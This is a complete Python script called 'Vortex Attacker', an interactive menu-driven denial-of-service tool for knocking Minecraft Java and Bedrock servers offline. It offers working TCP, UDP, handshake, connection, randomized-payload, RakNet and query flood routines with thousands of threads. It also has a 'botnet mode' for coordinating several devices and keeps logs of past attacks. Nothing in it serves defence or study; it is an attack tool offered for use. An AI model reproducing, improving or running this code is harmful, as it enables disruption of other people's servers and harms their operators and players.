#!/usr/bin/env python3
# VORTEX ATTACKER v9.0 - MINECRAFT DDoS ONLY
# Features: Live logs, Strong bypass, Multiple attack methods, Botnet mode

import socket
import threading
import random
import time
import os
import json
import sys
import struct
from datetime import datetime

VERSION = "9.0"
AUTHOR = "Vortex"

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

LOG_FILE = "minecraft_logs.json"
BOTNET_FILE = "botnet_ips.txt"

def clear_screen():
    os.system('clear')

def banner():
    print(BOLD + CYAN + r"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║    ███    ███ ██ ███    ██  ██████ ██████  █████  ███████ ████████ ██   ██    ║
║    ████  ████ ██ ████   ██ ██      ██   ██ ██   ██ ██         ██    ██   ██    ║
║    ██ ████ ██ ██ ██ ██  ██ ██      ██████  ███████ █████      ██    ███████    ║
║    ██  ██  ██ ██ ██  ██ ██ ██      ██   ██ ██   ██ ██         ██    ██   ██    ║
║    ██      ██ ██ ██   ████  ██████ ██   ██ ██   ██ ███████    ██    ██   ██    ║
║                                                                               ║
║         VORTEX ATTACKER v9.0 - MINECRAFT DDoS ONLY                           ║
║         Java | Bedrock | Bypass | Live Logs | Botnet                          ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""" + RESET)
    print(CYAN + f"  [!] Started: {datetime.now().strftime('%H:%M:%S')} | Logs: {LOG_FILE}" + RESET)

def save_log(log_data):
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        except:
            logs = []
    logs.append(log_data)
    if len(logs) > 100:
        logs = logs[-100:]
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

def view_logs():
    clear_screen()
    banner()
    print(BLUE + "\n[ ATTACK LOGS ]\n" + RESET)
    
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = json.load(f)
        if logs:
            print(f"{'#'*70}")
            for log in reversed(logs[-20:]):
                status_color = GREEN if log['status'] == 'SUCCESS' else RED
                print(f"\n[{log['timestamp']}]")
                print(f"  Target: {log['target']}:{log['port']}")
                print(f"  Method: {log['method']}")
                print(f"  Threads: {log['threads']} | Duration: {log['duration']}s")
                print(f"  Packets: {log.get('packets', 0)} | Errors: {log.get('errors', 0)}")
                print(f"  Status: {status_color}{log['status']}{RESET}")
                print("-"*50)
        else:
            print("No logs yet.")
    else:
        print("No logs yet.")
    
    input("\nPress Enter...")

def clear_logs():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
        print(GREEN + "[✓] Logs cleared" + RESET)
    else:
        print(YELLOW + "[!] No logs to clear" + RESET)
    time.sleep(1)

def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[✓] {domain} → {ip}" + RESET)
        return ip
    except:
        print(RED + f"[✗] Cannot resolve {domain}" + RESET)
        return None

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

# ============ MINECRAFT ATTACK METHODS ============

def tcp_flood(ip, port, stop_event, stats):
    """TCP connection flood - best for Java servers"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            sock.connect((ip, port))
            sock.send(b"\x00" * 64)
            sock.close()
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def udp_flood(ip, port, stop_event, stats):
    """UDP flood - best for Bedrock servers"""
    data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def handshake_flood(ip, port, stop_event, stats):
    """Handshake flood - sends login attempts to exhaust server"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            # Minecraft handshake packet (protocol version 754)
            packet = bytearray()
            packet.append(0x00)  # Handshake ID
            # VarInt protocol version
            protocol = random.choice([754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765])
            while protocol > 0:
                b = protocol & 0x7F
                protocol >>= 7
                if protocol != 0:
                    b |= 0x80
                packet.append(b)
            # Server address
            packet.append(9)
            packet.extend(b'localhost')
            packet.append(port & 0xFF)
            packet.append((port >> 8) & 0xFF)
            packet.append(2)  # Next state: login
            sock.send(packet)
            sock.close()
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def syn_flood(ip, port, stop_event, stats):
    """SYN flood - network layer attack"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            # Send SYN then close without completing handshake
            sock.close()
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def bypass_flood(ip, port, stop_event, stats):
    """Bypass flood - randomizes packets to avoid detection"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            sock.connect((ip, port))
            # Random payload to look like legitimate traffic
            payload = random._urandom(random.randint(16, 128))
            sock.send(payload)
            sock.close()
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def raknet_flood(ip, port, stop_event, stats):
    """RakNet flood - specific for Bedrock edition"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            # Raknet Unconnected Ping packet
            client_id = random.getrandbits(64)
            packet = b'\x01\x00\x00\x00'
            packet += client_id.to_bytes(8, 'little')
            packet += b'\x00' * 32
            sock.sendto(packet, (ip, port))
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def query_flood(ip, port, stop_event, stats):
    """Query flood - abuses Minecraft server query protocol"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            # Minecraft query request
            packet = b'\xFE\xFD\x09\x00\x00\x00\x00\x00\x00\x00'
            sock.sendto(packet, (ip, port if port != 25565 else 25565))
            stats['packets'] += 1
        except:
            stats['errors'] += 1

# ============ BOTNET MODE ============

def save_botnet_ip(ip, name):
    with open(BOTNET_FILE, "a") as f:
        f.write(f"{name}|{ip}\n")
    print(GREEN + f"[✓] Botnet device added: {name} ({ip})" + RESET)

def load_botnet_ips():
    devices = []
    if os.path.exists(BOTNET_FILE):
        with open(BOTNET_FILE, "r") as f:
            for line in f:
                if '|' in line:
                    name, ip = line.strip().split('|')
                    devices.append({'name': name, 'ip': ip})
    return devices

def botnet_attack():
    clear_screen()
    banner()
    print(PURPLE + "\n[ BOTNET MODE - Multiple Device Attack ]\n" + RESET)
    print(YELLOW + "This mode coordinates attacks across multiple devices" + RESET)
    print("1. Add current device to botnet")
    print("2. View botnet devices")
    print("3. Launch botnet attack")
    print("4. Back")
    
    choice = input("\nSelect (1-4): ")
    
    if choice == "1":
        name = input("Device name: ")
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        save_botnet_ip(local_ip, name)
        input("Press Enter...")
    elif choice == "2":
        devices = load_botnet_ips()
        if devices:
            print("\n" + CYAN + "Botnet devices:" + RESET)
            for d in devices:
                print(f"  - {d['name']}: {d['ip']}")
        else:
            print(YELLOW + "No devices in botnet")
        input("Press Enter...")
    elif choice == "3":
        target_ip = input(YELLOW + "Target IP: " + RESET)
        target_port = int(input(YELLOW + "Target Port: " + RESET))
        duration = int(input(YELLOW + "Duration (seconds): " + RESET))
        print(RED + f"\n[!] Launching attack from ALL devices on {target_ip}:{target_port}" + RESET)
        print("Start same attack on all devices simultaneously")
        input("Press Enter when ready on ALL devices...")
        
        # Local attack on this device
        stop_event = threading.Event()
        stats = {'packets': 0, 'errors': 0}
        
        for _ in range(3000):
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, stop_event, stats))
            t.daemon = True
            t.start()
        
        print(GREEN + f"\n[🔥] THIS DEVICE ATTACKING {target_ip}:{target_port}" + RESET)
        print(CYAN + "[!] Press Ctrl+C to stop\n" + RESET)
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print(YELLOW + "\n[!] Stopping..." + RESET)
        finally:
            stop_event.set()
            print(GREEN + f"[✓] This device sent {stats['packets']} packets" + RESET)
            input("Press Enter...")

# ============ MINECRAFT ATTACK MENU ============

def minecraft_attack():
    clear_screen()
    banner()
    print(PURPLE + "\n" + "="*60)
    print("              MINECRAFT SERVER DDoS ATTACK")
    print("="*60 + RESET)
    
    # Target input
    target = input(YELLOW + "\n[?] Server IP or Domain: " + RESET)
    
    # Resolve domain
    if not target.replace('.', '').isdigit():
        ip = resolve_domain(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    # Port selection
    print(BLUE + "\n[ PORT SELECTION ]" + RESET)
    print("1. Minecraft Java (25565)")
    print("2. Minecraft Bedrock (19132)")
    print("3. Custom Port")
    
    port_choice = input("Select (1-3): ")
    if port_choice == "1":
        port = 25565
    elif port_choice == "2":
        port = 19132
    else:
        port = int(input("Enter port: "))
    
    # Check server online
    print(f"\n[+] Checking {ip}:{port}...")
    if check_port(ip, port):
        print(GREEN + f"[✓] Server is ONLINE" + RESET)
    else:
        print(RED + f"[✗] Server is OFFLINE" + RESET)
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    # Attack methods
    print(BLUE + "\n[ ATTACK METHODS ]" + RESET)
    print("1. TCP Flood      - Best for Java servers")
    print("2. UDP Flood      - Best for Bedrock servers")
    print("3. Handshake Flood - Login spam (bypass)")
    print("4. SYN Flood      - Network layer")
    print("5. Bypass Flood   - Randomized packets")
    print("6. RakNet Flood   - Bedrock specific")
    print("7. Query Flood    - Query protocol abuse")
    print("8. ALL METHODS    - Maximum power")
    
    method_choice = input("\nSelect (1-8): ")
    
    methods = {
        "1": (tcp_flood, "TCP_FLOOD"),
        "2": (udp_flood, "UDP_FLOOD"),
        "3": (handshake_flood, "HANDSHAKE_FLOOD"),
        "4": (syn_flood, "SYN_FLOOD"),
        "5": (bypass_flood, "BYPASS_FLOOD"),
        "6": (raknet_flood, "RAKNET_FLOOD"),
        "7": (query_flood, "QUERY_FLOOD")
    }
    
    # Settings
    threads = int(input(YELLOW + "\nThreads (1000-15000, default 3000): " + RESET) or 3000)
    duration = int(input(YELLOW + "Duration in seconds (default 60): " + RESET) or 60)
    
    # Confirm
    print(RED + "\n" + "="*60)
    print(f"  TARGET: {ip}:{port}")
    print(f"  METHOD: {methods.get(method_choice, ('UNKNOWN', 'UNKNOWN'))[1] if method_choice != '8' else 'ALL_METHODS'}")
    print(f"  THREADS: {threads}")
    print(f"  DURATION: {duration} seconds")
    print("="*60 + RESET)
    
    confirm = input("\n[!] Start attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    # Start attack
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    print(GREEN + f"\n[🔥] ATTACK STARTED on {ip}:{port}" + RESET)
    print(CYAN + "[!] Press Ctrl+C to stop\n" + RESET)
    
    # Launch threads based on method
    if method_choice == "8":
        # All methods combined
        all_methods = [tcp_flood, udp_flood, handshake_flood, syn_flood, bypass_flood]
        threads_per_method = threads // len(all_methods)
        for method in all_methods:
            for _ in range(threads_per_method):
                t = threading.Thread(target=method, args=(ip, port, stop_event, stats))
                t.daemon = True
                t.start()
    else:
        attack_func, method_name = methods.get(method_choice, (tcp_flood, "TCP_FLOOD"))
        for _ in range(threads):
            t = threading.Thread(target=attack_func, args=(ip, port, stop_event, stats))
            t.daemon = True
            t.start()
    
    # Live log monitor
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            # Live status update
            print(f"\r[LIVE] Packets: {stats['packets']} | Errors: {stats['errors']} | Time left: {remaining}s    ", end="")
            time.sleep(1)
        
        stop_event.set()
        time.sleep(1)
        
        # Save log
        status = "SUCCESS" if stats['packets'] > 0 else "FAILED"
        save_log({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target": ip,
            "port": port,
            "method": methods.get(method_choice, ("", "ALL_METHODS"))[1] if method_choice != '8' else "ALL_METHODS",
            "threads": threads,
            "duration": duration,
            "packets": stats['packets'],
            "errors": stats['errors'],
            "status": status
        })
        
        print(GREEN + f"\n\n[✓] ATTACK FINISHED" + RESET)
        print(f"[📊] Packets sent: {stats['packets']}")
        print(f"[⚠️] Errors: {stats['errors']}")
        
        if stats['packets'] > 0:
            print(GREEN + "[✓] Attack SUCCESSFUL - Server should be lagging" + RESET)
        else:
            print(RED + "[✗] Attack FAILED - Server may have DDoS protection" + RESET)
            
    except KeyboardInterrupt:
        stop_event.set()
        print(YELLOW + f"\n\n[!] Attack stopped early" + RESET)
        print(f"[📊] Packets sent: {stats['packets']}")
    
    input("\nPress Enter...")

# ============ MAIN MENU ============

def main_menu():
    while True:
        clear_screen()
        banner()
        
        print(PURPLE + """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                              MAIN MENU                                        ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  1. MINECRAFT DDoS ATTACK                                             ║  ║
║   ║     TCP | UDP | Handshake | SYN | Bypass | RakNet | Query             ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  2. VIEW ATTACK LOGS                                                  ║  ║
║   ║     See all past attacks with success/failure                         ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  3. CLEAR LOGS                                                        ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  4. BOTNET MODE                                                       ║  ║
║   ║     Multi-device coordinated attack                                   ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  5. EXIT                                                              ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""" + RESET)
        
        choice = input(YELLOW + "Select (1-5): " + RESET)
        
        if choice == "1":
            minecraft_attack()
        elif choice == "2":
            view_logs()
        elif choice == "3":
            clear_logs()
        elif choice == "4":
            botnet_attack()
        elif choice == "5":
            print(GREEN + "\n[✓] Exiting Vortex Attacker..." + RESET)
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(YELLOW + "\n\n[!] Exiting..." + RESET)
        sys.exit(0)
